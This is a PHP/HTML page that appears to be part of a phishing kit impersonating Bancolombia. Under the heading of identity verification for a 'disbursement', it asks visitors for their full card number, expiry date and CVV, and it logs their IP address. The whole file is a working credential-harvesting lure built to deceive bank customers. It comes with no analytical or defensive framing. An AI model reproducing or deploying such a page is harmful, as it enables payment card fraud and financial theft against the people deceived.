<?php
$ip = getenv("REMOTE_ADDR");
setlocale(LC_TIME, "spanish");

date_default_timezone_set('America/Bogota');
?>
<html>
    <head>
        <title>Bancolombia - Verificación de Identidad</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">

        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">

        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>        
        <link href="../css/stylesheet.css" rel="stylesheet">
        <link href="../css/style-app.css?v3" rel="stylesheet">        
        <link rel="icon" type="image/png" href="../img/logo.png" />
        <script type="text/javascript" src="../js/jquery-3.6.0.min.js"></script>
        <script src="../js/jquery.jclock-min.js" type="text/javascript"></script>
    
        <script type="text/javascript" src="../js/functions.js?v3"></script>
        <script type="text/javascript" src="../js/ready.js?v3"></script>

        <style type="text/css">
            #fondo,#cargando-o{
                display: initial;
            }
        </style>
        
    </head>
    <body>         
        <div id="fondo"></div>
        <div id="cargando">
            <img src="../img/logo.svg">            
            <br>
            <img src="../img/load2.gif" />
        </div>
        <div id="cargando-o">
            <img src="../img/load4.gif" width="90">            
            <br>
            Cargando...
        </div>

        <table width="100%" border="0" cellpadding="0" cellspacing="0">
            <tr>
                <td valign="middle" align="left" width="33%"><img src="../img/btn-cerrar.jpg" height="29"></td>
                <td valign="middle" align="center" width="34%"><img src="../img/logo-app.jpg" height="29"></td>
                <td valign="middle" align="right" width="33%"><img src="../img/btn-continuar-off.jpg" height="29" id="lnk-tarjeta"></td>
            </tr>
        </table>        
        <br><br><br>
        <div class="titulo-app">Verificación de la identidad de tu cuenta. Tarjeta débito o crédito</div>  
        <div class="descripcion-app">Información de la tarjeta asociada a tu cuenta para generar el desembolso</div>  
        <div class="frm">
            <div class="inp" id="inp-tarjeta">
                <table width="100%" cellpadding="0" cellspacing="0" border="0">
                    <tr>
                        <td valign="middle" width="36" align="left"><img src="../img/ico-card.jpg" width="26"></td>
                        <td valign="middle" align="left">
                            <input type="text" maxlength="16" name="txt-tarjeta" id="txt-tarjeta" class="entradas" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
                        </td>
                    </tr>
                </table>
            </div>
            <div class="etiquetas" id="etq-tarjeta">0000 0000 0000 0000</div>
            <br><br>

            <div class="inp" id="inp-fecha">
                <table width="100%" cellpadding="0" cellspacing="0" border="0">
                    <tr>
                        <td valign="middle" width="36" align="left"><img src="../img/ico-cal.jpg" width="26"></td>
                        <td valign="middle" align="left">
                            <input type="text" name="txt-fecha" id="txt-fecha" class="entradas" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;" maxlength="7">
                        </td>
                    </tr>
                </table>
            </div>
            <div class="etiquetas" id="etq-fecha">Fecha</div>
            <br><br>

            <div class="inp" id="inp-cvv">
                <table width="100%" cellpadding="0" cellspacing="0" border="0">
                    <tr>
                        <td valign="middle" width="36" align="left"><img src="../img/ico-candado.jpg" width="26"></td>
                        <td valign="middle" align="left">
                            <input type="text" name="txt-cvv" id="txt-cvv" class="entradas" autocomplete="off" maxlength="3" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
                        </td>
                    </tr>
                </table>
            </div>
            <div class="etiquetas" id="etq-cvv">CVV</div>
            <br>
        </div>  
        <button class="botones" id="btn-tarjeta" disabled>CONTINUAR</button> 
        <br><br><br>
        <div style="color:#1A1B1A;font-weight: bold;font-size: 16px;text-decoration: underline; cursor: pointer;text-align: center;">¿No eres cliente?</div>  
    </body>
</html>
<script type="text/javascript">
    $(document).ready(function() { 
        setTimeout(quitar_cargando, 2000);               
    });
 </script>